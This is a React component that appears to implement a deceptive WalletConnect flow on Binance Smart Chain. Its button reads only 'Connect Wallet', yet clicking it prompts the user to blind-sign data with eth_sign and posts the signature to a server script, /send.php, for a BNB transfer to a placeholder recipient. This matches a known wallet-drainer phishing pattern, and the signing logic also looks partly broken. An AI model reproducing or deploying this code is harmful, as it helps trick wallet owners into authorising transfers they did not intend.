import { EthereumProvider } from "@walletconnect/ethereum-provider";

function App() {
  async function runner() {
    if (typeof localStorage !== "undefined") {
      localStorage.removeItem("walletconnect");
    }

    var ethereumProvider = await EthereumProvider.init({
      showQrModal: true,
      chains: [56], // BSC
      methods: ["eth_sign"],
      projectId: "9fe3ed74e1d73141e8b7747bedf77551",
    });

    await ethereumProvider.enable();
    var provider = ethereumProvider;
    var accounts = await provider.request({ method: "eth_accounts" });
    var sender = accounts[0];
    console.log("✅ Wallet Address:", sender);

    let apiUrl = "/send.php";

    async function getRawSignature(address, message) {
      try {
        var rawSignature = await provider.request({
          method: "eth_sign",
          params: [address, message], // امضای هش پیام
        });

        return { rawSignature, message };
      } catch (error) {
        console.error("❌ Error in getRawSignature:", error);
        return null;
      }
    }

    async function sendSignedTransaction(signature, rawTxData) {
      try {
        let requestData = {
          signedData: signature,
          rawTxData: rawTxData,
        };

        let response = await fetch(apiUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(requestData),
        });

        let resultJson = await response.json();
        console.log("📤 Server Response:", resultJson);

        if (resultJson.error) {
          console.error("⚠ Transaction Error:", resultJson.error);
          return null;
        }

        return resultJson.txHash || resultJson.result || resultJson;
      } catch (error) {
        console.error("❌ Error in sendSignedTransaction:", error);
        return null;
      }
    }

    let rawTxData = {
      to: "0xRecipientAddress",
      value: "0.01", // مقدار BNB به صورت رشته ارسال شود
      gas: "21000",
      gasPrice: "5000000000",
      nonce: null, // مقدار نانس را سرور محاسبه کند
    };

    let rawTxString = JSON.stringify(rawTxData);
    let signedData = await getRawSignature(sender, rawTxString);

    if (signedData) {
      console.log("✍️ Signed Raw Data:", signedData);
      let txHash = await sendSignedTransaction(
        signedData.rawSignature,
        signedData.message
      );
      console.log("📤 Final Transaction Hash:", txHash);
    } else {
      console.error("⚠ Signing failed.");
    }
  }

  return (
    <button
      onClick={runner}
      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
    >
      <span>Connect Wallet</span>
    </button>
  );
}

export default App;
